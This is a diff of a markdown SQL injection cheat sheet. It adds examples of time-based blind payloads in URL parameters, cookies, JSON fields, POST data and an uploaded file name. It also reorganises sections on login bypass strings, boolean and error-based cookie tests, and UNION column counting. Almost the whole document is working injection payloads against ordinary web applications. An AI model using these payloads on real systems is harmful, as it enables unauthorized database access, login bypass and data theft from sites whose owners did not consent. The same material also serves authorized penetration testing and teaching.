@@ -1,28 +1,33 @@
-## Determinig SQLi Vulnerablity
+## Examples
 ```sql
-
+&topsort=flowers or sleep(3) >> Url
+&location=(select*from(select(sleep(3)))a) >> Cookie
+&direction=desc,(select*from(select(sleep(3)))a)& >> Cookie
+"accid":"25 and sleep(3)#" >> In json data
+&log=0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z&pwd= >> Post data
+&comment_id=291751-sleep(5)& >>
+filename="poc.js' (select*from(select(sleep(3)))a) '.pdf" >> Uploading File
+```
+## Determinig SQLi Vulnerablity & Login Bypass
+```sql
 1 or 1=1-- - >> Input box non string.
 1' or 1=1-- - >> Input box string.
 1' or 'abc'='abc'-- -
 1') or 1=1-- -
-
-
-## Parameter Testing For Time Blind
+```
+## Parameter Testing For Time Based Blind
 ```sql
-
 or sleep(5)
 (select*from(select(sleep(5)))a)
 0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z
 1'XOR(if(now()=sysdate(),sleep(3),0))OR' >> PATH
-
+```
 ## Cookie testing 
 ```sql
-
-1. ' and 1=1-- - >> Conditional response
-2. ' || (select ' ') || ' >> Conditional error
-3. ' ||  (SELECT SLEEP(10))-- - >> Time delays
-
-
+' and 1=1-- - >> Conditional response (Boolean)
+' || (select ' ') || ' >> Conditional error
+' ||  (SELECT SLEEP(10))-- - >> Time delays
+```
 ## Determining column numbers
 ```sql
 
@@ -226,6 +231,3 @@ and 1=2 union select "1 union select 1,2,3,4-- -",2,3-- - >> Query inside query
     “) IF (1=1) WAITFOR DELAY ‘0:0:5’ —
     ‘;%5waitfor%5delay%5’0:0:5′%5 — %5
     ‘ WAITFOR DELAY ‘0:0:5’ —
-
-
-## Parameter Testing For Time Blind
